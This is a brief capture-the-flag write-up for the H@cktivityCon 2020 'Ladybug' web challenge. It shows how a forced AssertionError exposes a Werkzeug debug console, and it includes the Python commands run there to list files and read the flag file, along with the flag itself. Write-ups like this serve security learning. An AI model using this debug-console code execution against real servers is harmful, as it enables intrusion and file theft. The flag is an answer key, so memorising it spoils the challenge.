# H@cktivityCon CTF 2020 Ladybug Writeup
by qpwoeirut

Category: Web<br>
Points: 100<br>

> Want to check out the new Ladybug Cartoon? It's still in production, so feel free to send in suggestions!
>
> Connect with one instance below:
> http://one.jh2i.com:50018
> http://two.jh2i.com:50018
> http://three.jh2i.com:50018
> http://four.jh2i.com:50018
> http://five.jh2i.com:50018
> http://six.jh2i.com:50018


Try going to http://one.jh2i.com:50018/film/flag/, will cause AssertionError.
This opens up a debugging console where we can execute any python we want.
```
>>> import os
>>> os.listdir()
['flag.txt', 'templates', 'main.py', 'requirements.txt']
>>> open('flag.txt').read()
'flag{weurkzerg_the_worst_kind_of_debug}'
```

`flag{weurkzerg_the_worst_kind_of_debug}`